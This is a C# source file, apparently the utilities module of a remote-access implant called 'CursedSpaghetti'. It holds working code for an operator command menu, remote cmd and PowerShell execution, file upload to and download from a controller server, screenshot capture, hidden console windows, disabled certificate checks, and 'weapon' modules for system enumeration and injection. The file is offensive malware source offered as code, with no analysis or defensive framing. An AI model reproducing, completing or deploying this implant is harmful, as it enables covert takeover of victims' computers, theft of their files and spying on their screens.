using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;
using Weapons;

namespace CursedSpaghetti
{
    class Utilities
    {
        // Get Help
        public static string PrintHelp()
        {
            return "!#!\n  Spaghetti Overdose\n" +
                " ----------------------------------------------------------\n" +
                "   <command>               Run cmd command [Default]\n" +
                "   download <file>         Download file\n" +
                "   exit                    Close the client connection\n" +
                "   help                    Print this message\n" +
                "   powershell <command>    Run powershell command\n" +
                "   screnshot               Take a screenshot\n" +
                "   session                 Get session ID\n" +
                "   upload                  Upload file" +
                "   weapon                  Use a weapon module\n";

        }

        [DllImport("kernel32.dll")]
        static extern public IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern public bool ShowWindow(IntPtr hWnd, int nCmdShow);

        // File to byte[]
        public static byte[] FileToByte(string location, string filename)
        {
            string initial = Directory.GetCurrentDirectory();
            Directory.SetCurrentDirectory(location);
            byte[] fbyte = new byte[0];
            if (File.Exists(filename))
            {
                fbyte = File.ReadAllBytes(filename);
            }
            Directory.SetCurrentDirectory(initial);
            return fbyte;
        }


        // Interactive Command Line Protection
        public static bool CliProtection(string cmd)
        {
            bool check;
            cmd = cmd.ToLower();
            cmd.Replace(".exe", "");
            switch (cmd)
            {
                case "cmd":
                    check = false;
                    break;
                case "nslookup":
                    check = false;
                    break;
                case "powershell":
                    check = false;
                    break;
                case "python":
                    check = false;
                    break;
                case "wmic":
                    check = false;
                    break;
                default:
                    check = true;
                    break;
            }

            return check;
        }

        // Choose Weapon
        public static void ChooseWeapon(string fs_url, string url, string weapon, string sessionid)
        {
            weapon = weapon.Substring(7);

            switch (weapon.Split(' ')[1].ToLower())
            {
                case "basicenum":
                    Gatherer.ListBasicOSInfo(url);
                    break;
                case "inject":
                    string targetFile = weapon.Substring(7).Replace(" ", "");
                    Injector.Inject(String.Format("{0}/{1}/{2}", fs_url, sessionid, targetFile));
                    break;
                default:
                    Post(url, "#!#Weapon does not exist");
                    break;
            }
        }

        // Check Root Dir
        public static string IsRoot(string location)
        {
            if (location.Length < 3 && Regex.IsMatch(location, @"[A-Za-z]{1}:"))
            {
                return String.Concat(location, "\\");
            }
            return location;
        }

        // HTTP Get Request
        public static string Get(string uri, string location, string sessionid)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                request.Headers.Add("Current-Location", location);
                request.Headers.Add("Session-Id", sessionid);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                // Ignore SSL Certificate errors
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.Timeout)
                {
                    Post(uri, "#!#Request Timeout.. try again!");
                    return Get(uri, location, sessionid);
                }
                Thread.Sleep(60000); // sleep for 1 min
                return Get(uri, location, sessionid);
            }
        }

        // HTTP Get Request for File upload
        public static void GetFile(string target, string uri, string filename, string location, string sessionid)
        {
            string bkp_location = Directory.GetCurrentDirectory();
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(target);
                request.Headers.Add("Current-Location", location);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

                // Ignore SSL Certificate errors
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                {
                    int bufferSize = 1024;
                    byte[] buffer = new byte[bufferSize];
                    int bytesRead = 0;

                    Directory.SetCurrentDirectory(location);
                    FileStream fileStream = File.Create(filename);
                    while ((bytesRead = stream.Read(buffer, 0, bufferSize)) != 0)
                    {
                        fileStream.Write(buffer, 0, bytesRead);
                    }
                    fileStream.Close();
                }
            }
            catch (WebException e)
            {
                Directory.SetCurrentDirectory(bkp_location);
                if (e.Status == WebExceptionStatus.Timeout)
                {
                    Post(uri, "#!#Request Timeout.. try again!");
                    GetFile(target, uri, filename, location, sessionid);
                }
                else
                {
                    Post(uri, "#!# -- Failed --");
                }
            }
            Post(uri, "!#! -- Success --");
            Directory.SetCurrentDirectory(bkp_location);
        }

        // HTTP Post Request
        public static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
        {
            try
            {
                byte[] dataBytes = Encoding.UTF8.GetBytes(data);

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
                request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
                request.ContentLength = dataBytes.Length;
                request.ContentType = contentType;
                request.Method = method;

                // Ignore SSL Certificate errors
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                using (Stream requestBody = request.GetRequestStream())
                {
                    requestBody.Write(dataBytes, 0, dataBytes.Length);
                }

                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                using (Stream stream = response.GetResponseStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    return reader.ReadToEnd();
                }
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.Timeout)
                {
                    Post(uri, "#!#Request Timeout.. try again!");
                }
                else
                {
                    Post(uri, "#!# -- Failed --");
                }
                return "";
            }
        }

        // HTTP Put Request
        public static void Put(string fs_uri, string uri, string filename, string location, string sessionid, string method = "PUT")
        {
            string output = "";
            byte[] content = FileToByte(location, filename);
            if (content.Length == 0)
            {
                output = "#!#File is empty or does not exist";
            }
            else
            {
                using (var client = new WebClient())
                {
                    // Ignore SSL Certificate errors
                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                    client.Headers.Add("Session-Id", sessionid);

                    string[] splitted = filename.Split(Path.DirectorySeparatorChar);
                    filename = splitted[splitted.Length - 1];

                    client.Headers.Add("File-Name", filename);
                    client.UploadData(fs_uri, method, content);
                    output = "!#! -- Success --";
                }
            }

            Post(uri, output);
        }

        // Take Screeshot
        public static void takeScreenShot(string location, string filename)
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                bmp.Save(String.Format("{0}/{1}", location, filename));  // saves the image

            }
        }

        // Get Timestamp
        public static string GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssfff");
        }
    }
}
